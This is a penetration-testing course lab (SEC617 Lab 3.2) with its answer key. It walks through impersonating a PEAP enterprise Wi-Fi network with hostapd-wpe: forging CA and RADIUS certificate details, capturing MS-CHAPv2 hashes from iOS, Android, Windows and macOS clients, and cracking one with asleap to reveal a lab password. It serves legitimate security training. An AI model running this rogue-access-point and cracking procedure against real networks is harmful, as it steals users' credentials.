# Impersonating PEAP networks

### SEC617 Lab 3.2 <a href="#sec617-lab-3.2" id="sec617-lab-3.2"></a>

### Exercise: Impersonating PEAP Networks <a href="#exercise-impersonating-peap-networks" id="exercise-impersonating-peap-networks"></a>

Complete the exercises in this lab to reinforce the material covered in the _Attacking WPA2-Enterprise Networks_ module. To complete these exercises, you will need the Kali Linux VM supplied on the SEC617 USB drive.

**Purpose:** This lab provides hands-on practice in setting up an imposter PEAP network to intercept MS-CHAPv2 credentials.

**Description:** In this lab, you will establish an imposter PEAP network, setting up a custom Certificate Authority (CA) and RADIUS server using the `hostapd-wpe` software. In an actual pen test, you would evaluate and identify a target based on client probe or observed network behavior before setting up the PEAP imposter network. Here we will establish a custom network SSID and connect with a victim device you control to get hands-on experience with the attack process and password cracking result.

Complete this exercise using the Kali Linux VM. You will also use an additional client device as the victim, which can be a Windows 10, macOS, iOS, or Android victim. Connect your SWAT kit Wi-Fi card to the Kali Linux VM before starting this exercise.

> In this exercise, you will configure Hostapd-wpe to impersonate the target company CHOAM while also impersonating the VeriSign CA.

#### Examine Reconnaissance Packet Capture <a href="#examine-reconnaissance-packet-capture" id="examine-reconnaissance-packet-capture"></a>

The first step in implementing a Hostapd-wpe attack is to perform the reconnaissance analysis necessary to identify the issuing certificate authority and the server certificate information. Open the packet capture `/root/sec617/peap.pcap` with Wireshark. Apply the display filter `eap or eapol` to examine EAP traffic. Scroll to and select the first packet disclosing certificate details as part of the PEAP authentication exchange, as shown here.

Expand the detail view of the selected packet, navigating to the first certificate _Relative Distinguished Name sequence_ (`rdnSequence`), as shown here. This view allows us to identify the **server certificate** information, disclosing the common name, email address, organization name, and more.

Collapse the current certificate details, then expand the second certificate detail view `rdnSequence` information. This view discloses the **CA certificate** information, identifying the signing authority certificate details, as shown here.

> Keep Wireshark open with these certificate details handy as you continue through the exercise.

#### Edit Certificate Fields <a href="#edit-certificate-fields" id="edit-certificate-fields"></a>

Before launching the `hostapd-wpe` attack, you should customize the certificate details for the signing CA and the RADIUS server. This will increase the likeliness of successful password credential recovery.

Open a terminal and change to the `/etc/hostapd-wpe/certs` directory. List the contents of the directory as shown here.

```
# cd /etc/hostapd-wpe/certs
# ls
bootstrap  ca.cnf  Makefile  README  README.wpe  server.cnf  xpextensions
```

The `ca.cnf` and `server.cnf` files are the files to edit to customize the signing authority and server certificate information. The `bootstrap` script is used to build the certificates, using the `xpextensions` file to set the appropriate OIDs for wireless TLS authentication.

First, edit the `ca.cnf` file using `gedit` (or another editor of your choice).

```
# gedit ca.cnf
```

Scroll to the section beginning with `[certificate_authority]`. Replace the `countryName`, `stateOrProvinceName`, `localityName`, `organizationName`, `emailAddress`, and `commonName` fields with values of your choosing, matching the certificate details observed in the `peap.pcap` packet capture for the issuing CA. When complete, your configuration file should look similar to the following example.

> Tip: If you want to omit any optional CA or server certificate fields (such as the `stateOrProvinceName` or the `localityName`, add a `#` to the beginning of the line in the configuration file.

When you are finished editing the file, save and close `gedit`.

Next, edit the `server.cnf` file:

```
# gedit server.cnf
```

Scroll to the `[server]` section and edit the same fields, this time populating the information disclosed in the Wireshark certificate for the RADIUS server (you will have to navigate back to the first certificate in the Wireshark view). When complete, your configuration file should look similar to the following example.

> In the Wireshark capture for the server certificate, the `localityName` field is not supplied. Comment out this line by adding a `#` at the beginning of the line to omit this parameter in the server certificate.

When you are finished editing the file, save and close `gedit`.

#### Generate Imposter Certificates <a href="#generate-imposter-certificates" id="generate-imposter-certificates"></a>

Before we begin generating new certificates, let’s clean up the old ones in the `/etc/hostapd-wpe/certs` directory by removing a few files as shown here.

```
# rm server.csr server.key server.crt serial index.txt
```

Then, from the `/etc/hostapd-wpe/certs` directory, generate the new certificates used to impersonate the victim RADIUS server by running the `./bootstrap` script, as shown here.

```
# ./bootstrap 
openssl dhparam -out dh -2 2048
Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time
 ... omitted
Certificate Details:
        Serial Number: 1 (0x1)
        Validity
            Not Before: Jun 21 21:20:18 2018 GMT
            Not After : Aug 20 21:20:18 2018 GMT
        Subject:
            countryName               = XY
            stateOrProvinceName       = Cloud City
            organizationName          = CHOAM
            commonName                = radius1.choam.xy
            emailAddress              = admin@choam.xy
        X509v3 extensions:
            X509v3 Extended Key Usage: 
                TLS Web Server Authentication
            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:http://www.example.com/example_ca.crl
 ... omitted
Write out database with 1 new entries
Data Base Updated
openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12  -passin pass:'whatever' -passout pass:'whatever'
openssl pkcs12 -in client.p12 -out client.pem -passin pass:'whatever' -passout pass:'whatever'
cp client.pem 'user@example.org'.pem
```

> The `bootstrap` script and the called `Makefile` also create a _client_ certificate. The contents of this certificate are not used for this attack and can be ignored.
>
> Any time we make changes to the `ca.cnf` or `server.cnf` files in order to regenerate new certificates using the `./bootstrap` command we need to perform the cleanup step using `rm server.csr server.key server.crt serial index.txt`.

#### Deploy Certificates <a href="#deploy-certificates" id="deploy-certificates"></a>

From the `/etc/hostapd-wpe/certs` directory, run `make install` to copy the generated certificates to the system-wide directory, as shown here.

```
# make install
install -d /etc/hostapd-wpe
install -m 644 dh /etc/hostapd-wpe
install -m 644 ca.pem /etc/hostapd-wpe
install -m 644 server.pem /etc/hostapd-wpe
install -m 644 server.key /etc/hostapd-wpe
```

#### Specify a Target SSID <a href="#specify-a-target-ssid" id="specify-a-target-ssid"></a>

In a penetration test, you would specify the SSID for hostapd-wpe that matches your target network. In our lab exercise this isn’t practical since everyone would have the same SSID. Instead, you will use a different unique SSID.

Change to the `/etc/hostapd-wpe` directory. Run the `setup.sh` script to create the `hostapd-wpe.conf` script as shown here.

```
# cd /etc/hostapd-wpe
# ./setup.sh 
 *** 
 *** Your channel number is: 10
 *** Your SSID is: HOSTAPWPE-fd9820
 *** 
```

The output of this script will be different for your system. Feel free to examine the contents of the `hostapd-wpe.conf` file.

#### Kill Interfering Wireless Processes <a href="#kill-interfering-wireless-processes" id="kill-interfering-wireless-processes"></a>

Before starting the `hostapd-wpe` process, it is necessary to kill any other processes attempting to control the wireless card. List any interfering functions by running the `airmon-ng` script with the `check` argument, as shown here.

```
# airmon-ng check

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

   PID Name
   616 NetworkManager
   847 wpa_supplicant
   850 dhclient
```

The `hostapd-wpe` process will not start with these other interfering processes running. To terminate these troublesome processes, run `airmon-ng check kill`, as shown here.

```
# airmon-ng check kill

Killing these processes:

   PID Name
   847 wpa_supplicant
   850 dhclient
```

> Note that the `NetworkManager` process died of its own accord between the _check_ and _kill_ phases.

#### Start Hostapd-wpe <a href="#start-hostapd-wpe" id="start-hostapd-wpe"></a>

Place the `wlan0` interface in the `UP` state, then start the `hostapd-wpe` process with the configuration file generated by the `setup.sh` script, as shown here.

```
# ifconfig wlan0 up
# hostapd-wpe ./hostapd-wpe.conf
Configuration file: ./hostapd-wpe.conf
Using interface wlan0 with hwaddr 9c:ef:d5:fd:98:20 and ssid "HOSTAPWPE-fd9820"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED 
```

> If you receive an error message `OpenSSL: pending error: error:2006D080:BIO routines:BIO_new_file:no such file`, return to the `/etc/hostapd-wpe/certs` directory and run `make install`.

If you browse for a list of available networks now you will see the presence of your new `hostapd-wpe` network.

> Continue with this exercise, attempting to connect to the `hostapd-wpe` network using an iOS, Android, Windows 10, or macOS system. We have included illustrations for each platform here.

#### \[OPTIONAL] Connect with iOS <a href="#5boptional-5d-connect-with-ios" id="5boptional-5d-connect-with-ios"></a>

Connect to the `hostapd-wpe` network using an iOS device. When iOS connects for the first time, it will prompt the user to enter a username and password, as shown here.

Enter any username and password information, then tap **Join**. iOS will prompt you to trust the RADIUS server certificate, as shown here.

Inspect the certificate details view by tapping the **More Details** option. iOS will display the certificate details that you chose when generating the certificate, as shown here.

Return to the Certificate screen by tapping the `< Certificate` option from the _Details_ screen. Tap the **Trust** button to continue the connection process. iOS will attempt to authenticate with the imposter RADIUS server, then return an _Unable to join the network_ error message as shown here. This is because mutual authentication with the RADIUS server failed in the MS-CHAPv2 exchange. However, the client has already sent the MS-CHAPv2 credentials to the attacker.

Return to the `hostapd-wpe` process. You will see the output of the attempted authentication exchange, similar to the example shown here.

```
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.1X: Identity received from STA: 'jwright'


mschapv2: Fri Jun 22 06:55:14 2018
	 username:	jwright
	 challenge:	f5:db:ee:34:71:fa:8f:99
	 response:	e3:da:b1:37:a3:e6:16:59:26:4f:e1:69:6c:ef:24:cd:78:9a:99:c1:7d:9d:b1:62
	 jtr NETNTLM:		jwright:$NETNTLM$f5dbee3471fa8f99$e3dab137a3e61659264fe1696cef24cd789a99c17d9db162
	 hashcat NETNTLM:	jwright::::e3dab137a3e61659264fe1696cef24cd789a99c17d9db162:f5dbee3471fa8f99
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.1X: Identity received from STA: 'jwright'
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.11: disassociated
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)
```

Later in this exercise you will leverage similar `hostapd-wpe` logging data to perform an offline password recovery attack.

#### \[OPTIONAL] Connect with Android (Nougat and Earlier) <a href="#5boptional-5d-connect-with-android-28nougat-and-earlier-29" id="5boptional-5d-connect-with-android-28nougat-and-earlier-29"></a>

Connect to the `hostapd-wpe` network using an Android device running Android Nougat (7) or earlier. When the Android device connects for the first time it will prompt the user to enter a username and password, as shown here.

Enter any username and password information, then tap **CONNECT**. Android does not prompt you to perform any additional certificate verification, automatically connecting to and sending authentication credentials to the imposter RADIUS server. After a short time, Android will indicate an _Authentication problem_ with the target network, as shown here.

Android will continue to attempt to connect to the target network multiple times until you choose a different wireless network.

Return to the `hostapd-wpe` process. You will see the output of the attempted authentication exchange, similar to the example shown here.

```
wlan0: STA d8:50:e6:31:49:4c IEEE 802.1X: Identity received from STA: 'anonymous'
wlan0: STA d8:50:e6:31:49:4c IEEE 802.1X: Identity received from STA: 'jwright'


mschapv2: Fri Jun 22 08:59:30 2018
	 username:	jwright
	 challenge:	4e:d5:7d:8e:ad:15:38:e4
	 response:	bd:5b:fc:b5:11:06:96:72:e6:0e:d0:db:98:4f:16:09:2f:6f:e0:4d:87:52:ee:c4
	 jtr NETNTLM:		jwright:$NETNTLM$4ed57d8ead1538e4$bd5bfcb511069672e60ed0db984f16092f6fe04d8752eec4
	 hashcat NETNTLM:	jwright::::bd5bfcb511069672e60ed0db984f16092f6fe04d8752eec4:4ed57d8ead1538e4
```

Later in this exercise you will leverage similar `hostapd-wpe` logging data to perform an offline password recovery attack.

#### \[OPTIONAL] Connect with Android (Oreo and Later) <a href="#5boptional-5d-connect-with-android-28oreo-and-later-29" id="5boptional-5d-connect-with-android-28oreo-and-later-29"></a>

Connect to the `hostapd-wpe` network using an Android device running Oreo (8) or later. When the Android device connects for the first time it will prompt the user to enter a username and password, as shown here.

This configuration departs significantly from earlier Android versions because the device will not connect to the network until the _CA certificate_ option is specified (the _CONNECT_ button will not be accessible until a CA certificate option is selected). The available CA certificate options are:

* Use system certificates
* Do not validate

If the user specifies _Use system certificates_, then they are also prompted to enter a _domain_ value as shown here.

In this configuration, Android Oreo and later devices will reject the certificate from the RADIUS server since it is not trusted by system certificates. If an adversary purchased certificates from a trusted authority (e.g., attacker purchases certificates from VeriSign, issued to attacker.xy), the certificate would be trusted but the domain name specified in the wireless connection properties would not match, rejecting the attacker RADIUS server.

To use a secure wireless configuration, the user must know how to configure the wireless connection settings, and must know the domain name of the RADIUS server certificate. It seems likely that some users will not know how to supply these values, opting instead to specify the _Do not validate_ option, shown here.

Configure your Android Oreo or later device to use the _Do not validate_ option (solely for this specific network target), then press the **CONNECT** button. Return to the `hostapd-wpe` process. You will see the output of the attempted authentication exchange, similar to the example shown here.

```
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.1X: Identity received from STA: 'jwright'


mschapv2: Fri Jun 22 06:55:14 2018
	 username:	jwright
	 challenge:	f5:db:ee:34:71:fa:8f:99
	 response:	e3:da:b1:37:a3:e6:16:59:26:4f:e1:69:6c:ef:24:cd:78:9a:99:c1:7d:9d:b1:62
	 jtr NETNTLM:		jwright:$NETNTLM$f5dbee3471fa8f99$e3dab137a3e61659264fe1696cef24cd789a99c17d9db162
	 hashcat NETNTLM:	jwright::::e3dab137a3e61659264fe1696cef24cd789a99c17d9db162:f5dbee3471fa8f99
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.1X: Identity received from STA: 'jwright'
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.11: disassociated
wlan0: STA 20:ab:37:81:7c:94 IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)
```

Later in this exercise you will leverage similar `hostapd-wpe` logging data to perform an offline password recovery attack.

#### \[OPTIONAL] Connect with Windows 10 <a href="#5boptional-5d-connect-with-windows-10" id="5boptional-5d-connect-with-windows-10"></a>

Connect to the `hostapd-wpe` network using Windows 10. When the device connects for the first time it will prompt the user to enter a username and password, as shown here.

Enter any username and password information, then tap **OK**. Windows 10 will prompt you to continue connecting to the target wireless network, as shown here. This is not problematic for users, since an adversary would establish the imposter network in a location where the victim expects the SSID to be present.

Click on the link labeled _Show certificate details_. Windows 10 will show the user the server thumbprint information, but does not attempt to validate the certificate or otherwise display certificate details, as shown here.

Click **Connect** to continue the connection process. Next, return to the `hostapd-wpe` process. You will see the output of the attempted authentication exchange, similar to the example shown here.

```
wlan0: STA 9c:ef:d5:fd:94:84 IEEE 802.1X: Identity received from STA: 'jwright'


mschapv2: Fri Jun 22 08:52:00 2018
	 username:	jwright
	 challenge:	20:18:82:76:92:89:b6:8d
	 response:	15:ad:54:15:39:4e:78:1a:41:05:4f:fe:ff:18:d1:f7:a3:79:39:61:54:9e:59:7a
	 jtr NETNTLM:		jwright:$NETNTLM$201882769289b68d$15ad5415394e781a41054ffeff18d1f7a3793961549e597a
	 hashcat NETNTLM:	jwright::::15ad5415394e781a41054ffeff18d1f7a3793961549e597a:201882769289b68d
```

Later in this exercise you will leverage similar `hostapd-wpe` logging data to perform an offline password recovery attack.

#### \[OPTIONAL] Connect with macOS <a href="#5boptional-5d-connect-with-macos" id="5boptional-5d-connect-with-macos"></a>

Connect to the `hostapd-wpe` network using a macOS system. When macOS connects for the first time, it will prompt the user to enter a username and password, as shown here.

Enter any username and password information, then tap **Join**. macOS will prompt you to trust the RADIUS server certificate, as shown here.

Inspect the certificate details view by tapping the **Show Certificate** option. macOS will display the certificate details that you chose when generating the certificate, as shown here. Note that macOS discloses that the imposter VeriSign certificate is not trusted, but allows the user to continue the connection anyway.

Click the **Continue** button to continue the connection process. Next, return to the `hostapd-wpe` process. You will see the output of the attempted authentication exchange, similar to the example shown here.

```
wlan0: STA 8c:85:90:c7:c1:d4 IEEE 802.1X: Identity received from STA: 'jwright'


mschapv2: Fri Jun 22 07:14:28 2018
	 username:	jwright
	 challenge:	c1:12:34:1b:27:85:b5:c4
	 response:	e9:8b:80:79:4f:4e:44:4e:c5:58:fe:48:f3:1d:d1:5e:09:9e:63:e2:84:db:de:50
	 jtr NETNTLM:		jwright:$NETNTLM$c112341b2785b5c4$e98b80794f4e444ec558fe48f31dd15e099e63e284dbde50
	 hashcat NETNTLM:	jwright::::e98b80794f4e444ec558fe48f31dd15e099e63e284dbde50:c112341b2785b5c4
wlan0: STA 8c:85:90:c7:c1:d4 IEEE 802.1X: Identity received from STA: 'jwright'
wlan0: STA 8c:85:90:c7:c1:d4 IEEE 802.1X: Identity received from STA: 'jwright'
wlan0: CTRL-EVENT-EAP-FAILURE 8c:85:90:c7:c1:d4
```

Later in this exercise you will leverage similar `hostapd-wpe` logging data to perform an offline password recovery attack.

#### Stop Hostapd-wpe <a href="#stop-hostapd-wpe" id="stop-hostapd-wpe"></a>

Stop the `hostapd-wpe` process by pressing **CTRL+C** in that terminal window.

#### Examine Hostapd-wpe Logging <a href="#examine-hostapd-wpe-logging" id="examine-hostapd-wpe-logging"></a>

Examine the credential information collected in the `hostapd-wpe.log` capture file. You will see an initial authentication exchange for the user _jwright_, followed by any additional authentication credentials for your testing.

```
# cat hostapd-wpe.log
mschapv2: Fri Jun 22 13:12:03 2018
	 username:	jwright
	 challenge:	ea:e5:2e:4d:f1:55:f2:38
	 response:	65:76:b8:33:d6:29:dc:40:03:e2:62:7a:38:90:23:42:1f:3e:0e:f2:bf:8f:57:31
	 jtr NETNTLM:		jwright:$NETNTLM$eae52e4df155f238$6576b833d629dc4003e2627a389023421f3e0ef2bf8f5731
	 hashcat NETNTLM:	jwright::::6576b833d629dc4003e2627a389023421f3e0ef2bf8f5731:eae52e4df155f238
 ... omitted
```

#### Crack MS-CHAPv2 Credentials <a href="#crack-ms-chapv2-credentials" id="crack-ms-chapv2-credentials"></a>

Use `asleap` to recover the password for the user _jwright_ with the rockyou.txt dictionary word list file. First, decompress the `/usr/share/wordlists/rockyou.txt.gz` file, as shown.

```
# gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Next, use `asleap` with the `-C` option to specify the challenge, the `-R` option to specify the response, and the `-W` option to specify the wordlist file.

```
# asleap -C ea:e5:2e:4d:f1:55:f2:38 -R 65:76:b8:33:d6:29:dc:40:03:e2:62:7a:38:90:23:42:1f:3e:0e:f2:bf:8f:57:31 -W /usr/share/wordlists/rockyou.txt 
asleap 2.2 - actively recover LEAP/PPTP passwords. 
Using wordlist mode with "/usr/share/wordlists/rockyou.txt".
```

> This same command is repeated here, broken up into multiple lines for legibility:

```
asleap -C ea:e5:2e:4d:f1:55:f2:38 
        -R 65:76:b8:33:d6:29:dc:40:03:e2:62:7a:38:90:23:42:1f:3e:0e:f2:bf:8f:57:31
        -W /usr/share/wordlists/rockyou.txt 
```

**Question**: What is the password recovered in the `hostapd-wpe.log` file for the `jwright` user?

### Identifying Vulnerable Clients - Answers <a href="#identifying-vulnerable-clients---answers" id="identifying-vulnerable-clients---answers"></a>

**Question:** What is the SSID that is commonly associated with open networks that a corpmobile client is searching for?

**Answer:** `attwifi`, shown in the graph excerpt below.

**Question:** What kind of associations can you identify among wireless clients?

**Answer:** The answer to this question will vary depending on your location and the number of devices within capture range of your monitor mode wireless card.

**Question:** What commonly open SSIDs do you see disclosed by client devices?

**Answer:** The answer to this question will vary depending on your location and the number of devices within capture range of your monitor mode wireless card.

### Exercise: Impersonating PEAP Networks - Answers <a href="#exercise-impersonating-peap-networks-answers" id="exercise-impersonating-peap-networks-answers"></a>

**Question**: What is the password recovered in the `hostapd-wpe.log` file for the `jwright` user?

**Answer**: “smartypants”

```
# cat hostapd-wpe.log 
mschapv2: Fri Jun 22 13:12:03 2018
	 username:	jwright
	 challenge:	ea:e5:2e:4d:f1:55:f2:38
	 response:	65:76:b8:33:d6:29:dc:40:03:e2:62:7a:38:90:23:42:1f:3e:0e:f2:bf:8f:57:31
	 jtr NETNTLM:		jwright:$NETNTLM$eae52e4df155f238$6576b833d629dc4003e2627a389023421f3e0ef2bf8f5731
	 hashcat NETNTLM:	jwright::::6576b833d629dc4003e2627a389023421f3e0ef2bf8f5731:eae52e4df155f238



mschapv2: Sat Jun 30 09:37:59 2018
	 username:	jwright
	 challenge:	15:78:07:c0:b8:51:76:42
	 response:	76:65:dd:87:38:e0:bc:3b:95:c9:cd:49:2f:0f:96:4c:5b:da:e1:68:1d:2d:39:58
	 jtr NETNTLM:		jwright:$NETNTLM$157807c0b8517642$7665dd8738e0bc3b95c9cd492f0f964c5bdae1681d2d3958
	 hashcat NETNTLM:	jwright::::7665dd8738e0bc3b95c9cd492f0f964c5bdae1681d2d3958:157807c0b8517642
# asleap -C ea:e5:2e:4d:f1:55:f2:38 -R 65:76:b8:33:d6:29:dc:40:03:e2:62:7a:38:90:23:42:1f:3e:0e:f2:bf:8f:57:31 -W /usr/share/wordlists/rockyou.txt 
asleap 2.2 - actively recover LEAP/PPTP passwords. 
Using wordlist mode with "/usr/share/wordlists/rockyou.txt".
	hash bytes:        1e90
	NT hash:           0dfc8ac0212a5f5041178904909d1e90
	password:          smartypants
```

**STOP**

This completes the lab exercise. Congratulations.
